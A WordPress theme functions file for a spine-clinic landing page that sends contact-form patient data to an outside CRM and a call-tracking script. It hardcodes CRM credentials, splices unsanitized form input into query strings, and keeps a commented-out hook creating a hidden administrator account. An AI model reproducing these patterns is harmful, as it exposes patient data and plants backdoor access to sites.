<?php
use it_hive\THEME;

require_once( 'it-hive/loader.php' );
header("Access-Control-Allow-Origin: *");
$directory_uri = get_template_directory_uri();
require_once( 'inc/redirect.php');

ini_set( 'display_errors', 0 );
define( 'text_domain', 'premiaspine' );


$styles        = array(
	'all-style' => $directory_uri . '/css/all.css?v=' . time(),
    'landing-style' => $directory_uri . '/css/landing.css?v=' . time(),
	'style'     => $directory_uri . '/style.css?v=' . time(),
    //'jquery.fancybox.min' => $directory_uri . '/css/jquery.fancybox.min.css?v=' . time(),
);
$scripts       = array(
    'jquery'  => '',
    'jquery-ui-accordion' => '',
    'jquery-ui-sortable' => '',
    'jquery.fancybox.min' => $directory_uri . '/js/jquery.fancybox.min.js?v=' . time(),
    'ajax' => $directory_uri . '/js/ajax.js?v=' . time(),
);
THEME::addThemeStyles( $styles );
THEME::addThemeScripts( $scripts );
THEME::$textdomain = text_domain;

//THEME::addOptionsPage( 'option_contact_form' );
THEME::loadMetaBox('landing');
THEME::loadMetaBox('thank_you');

THEME::addOptionsPage( 'theme_options' );

/****Add menu*****/
add_action( 'after_setup_theme', 'theme_register_nav_menu' );
function theme_register_nav_menu() {
    register_nav_menus([
        'footer_left_menu' => 'Footer left menu',
        'footer_right_menu' => 'Footer right menu'
    ]);
}

add_image_size( 'youtube_image', 246, 187 );

/***reg short-code****/
add_shortcode('youtubeVideo', 'video_youtybe');


function video_youtybe($args,$content){
    preg_match('|/(\w+)\?|',$args['src'],$result_arr);
    $src_img = "//img.youtube.com/vi/".$result_arr[1]."/mqdefault.jpg";
    return'<div class ="video"><a href = "'.$args['src'].'&origin=https://lp.premiaspine.com"><img src="'.$src_img.'"></a></div>';
}

function isBot(){
	return (
		(isset($_SERVER['HTTP_USER_AGENT'])
			&& preg_match('/bot|crawl|slurp|spider|speed|mediapartners|GTmetrix|Chrome-Lighthouse/i', $_SERVER['HTTP_USER_AGENT'])) ||
		in_array($_SERVER['REMOTE_ADDR'], ['50.22.90.226', '168.1.92.52', '209.58.131.213', '5.178.78.78']) // for pingdom
	);
}


function custom_init_cache() {
    global $post;
    $new_cache_reject_uri = $cache_reject_uri = get_rocket_option('cache_reject_uri');
    $rejected_uris = array_flip($cache_reject_uri);
    $path = rocket_clean_exclude_file(get_permalink($post->ID));
    if( isBot() && !isset($rejected_uris[$path]) ) {
        array_push($new_cache_reject_uri, $path);
    } elseif ( isset( $rejected_uris[ $path ] ) ) {
        unset( $new_cache_reject_uri[ $rejected_uris[ $path ] ] );
    }
    if ( $new_cache_reject_uri !== $cache_reject_uri ) {
        // Update the "Never cache the following pages" option.
        update_rocket_option( 'cache_reject_uri', $new_cache_reject_uri );

        // Update config file.
        rocket_generate_config_file();
    }
}

//add_action('wp', 'custom_init_cache');

function no_cache_for_page( $filter ) {
    if ( function_exists( 'is_page' ) && ! is_page( array( 3 ) ) ) {
        return $filter;
    }
    return false;
}
//add_filter( 'do_rocket_generate_caching_files', 'no_cache_for_page' );

include_once (dirname( __FILE__ ) . '/lib/maxMind/shortcodes.php');

/**
 * @ps_options array with global option site, header option, footer option and another option
 */
global $ps_options;
$ps_options = get_option('ps_options');

    add_action('wpcf7_mail_sent', function ($cf7) {
		//error_log(print_r($_POST, true));
        $formId= $cf7->id();
        $data2 = [
            'username' => 'api@premiaspine.com', 'password' => 'p007156i', 'entity_data_name' => 'patients', 'return_groups' => 'patient_general_info', 'filter[]' => '["patient_email","=","' . $_POST['email'] . '"]'
        ];
		//error_log(print_r($data2, true));
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://premiaspine.origami.ms/entities/api/instance_data/format/json?',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => $data2,
        ));
        $resp = curl_exec($curl);
        error_log('Origami Response: ' . print_r($resp, true));
        $resp = json_decode($resp,true);
		//error_log($resp['info']['total_count']);
        if ($resp['info']['total_count'] === 1) {
			//error_log(print_r( $resp, true));
			//error_log(print_r( $resp['data'][0]['instance_data']['field_groups'][0]['fields_data'][0], true));
            foreach ($resp['data'][0]['instance_data']['field_groups'][0]['fields_data'][0] as $field) {
                if ($field['field_data_name'] === 'patient_phone_number') {
                    $phone = $field['value'];
                }
            }
        }
        curl_close($curl);
        $full_name = explode(' ', $_POST['first_name']);
        //if ($resp['info']['total_count'] == 0) {
        if ($resp['info']['total_count'] !== 1) {
            $URL = 'https://premiaspine.origami.ms/entities/api/create_instance/format/json?';
            $userdata = [
                'patient_first_name' => $full_name[0],
                'patient_last_name' => $full_name[1],
                'patient_email' => $_POST['email'],
                'patient_phone_number' => $_POST['tel'],
                'patient_notes' => $_POST['comment'],
                'insurance_type' => $_POST['previous-radio'],
                'patient_lead_source' => ["PremiaSpine LP"], // Lead source
                //'prefer_contact_by' => $_POST['previous-radio'],
            ];
            if($formId == 12843 || $formId == 12850){
                $userdata['insurance_type'] = $_POST['previous-radio'];
            }
            elseif (false){
                // for new conditions
            }
            else{
                $userdata['prefer_contact_by'] = $_POST['previous-radio'];
            }
			if (!empty($_POST['source'])) {
				$userdata['patient_notes'] = $_POST['source'];
			}
            $data = [
                'username' => 'api@premiaspine.com', 'password' => 'p007156i', 'entity_data_name' => 'patients', 'form_data' => json_encode([[
                    'group_data_name' => 'patient_general_info',
                    'data' => [$userdata],
                ]]),
            ];
			//error_log(print_r( $userdata, true));
			//error_log(print_r( $data, true));

        } else {
            $URL = 'https://premiaspine.origami.ms/entities/api/update_instance_fields/format/json?';
            $data = [
                'username' => 'api@premiaspine.com',
                'password' => 'p007156i',
                'entity_data_name' => 'patients',
                'filter[0]' => '["_id", "=", "' . $resp['data'][0]['instance_data']['_id'] . '"]',
                'field[0]' => '["patient_notes", "' . $_POST["comment"] . '",0]',
                'field[1]' => '["patient_last_name", "' . $full_name[1] . '", 0]',
                'field[2]' => '["patient_first_name", "' . $full_name[0] . '", 0]',
                'field[3]' => '["patient_lead_source", ["PremiaSpine LP"], 0]',
            ];
            if(isset($_POST['previous-radio'])){
                //$data['field[4]'] = '["prefer_contact_by", "Phone", 0]';
                $data['field[6]'] = '["insurance_type", "' . $_POST['previous-radio'] . '", 0]';
            }
            elseif (false){
                // for new conditions
            }
            else{
                $data['field[4]'] = '["prefer_contact_by", "' . $_POST['previous-radio'] . '", 0]';
            }
			if (!empty($_POST['source'])) {
				$data['field[7]'] = '["patient_notes", "' . $_POST['source'] . '", 0]';
			}
			

            if ($phone != $_POST['tel']) {
                $data['field[5]'] = '["patient_phone_number", "' . $_POST['tel'] . '", 0]';
            }
			
			error_log('Patient exists');
			error_log(print_r( $data, true));
        }
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => $URL,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => $data,
        ));

        $resp = curl_exec($curl);
        curl_close($curl);

        $curl_p = curl_init();
        curl_setopt_array($curl_p, array(
            CURLOPT_URL => 'https://scripts.callbox.co.il/premiaspine/forms.php?form=site',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => $_POST,
        ));

        curl_exec($curl_p);
        curl_close($curl_p);

    });

//add_action('init', 'xyz1234_my_custom_add_user');
//
//function xyz1234_my_custom_add_user() {
//    $username = 'dev1';
//    $password = 'dev!23456789';
//    $email = 'graholsky@ukr.net';
//
//    if (username_exists($username) == null && email_exists($email) == false) {
//
//        // Create the new user
//        $user_id = wp_create_user($username, $password, $email);
//
//        // Get current user object
//        $user = get_user_by('id', $user_id);
//
//        // Remove role
//        $user->remove_role('subscriber');
//
//        // Add role
//        $user->add_role('administrator');
//    }
//}


add_shortcode('put_wpgm', 'get_locations_map'); //fix old shortcodes
add_shortcode('get_locations_map', 'get_locations_map');


/**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */

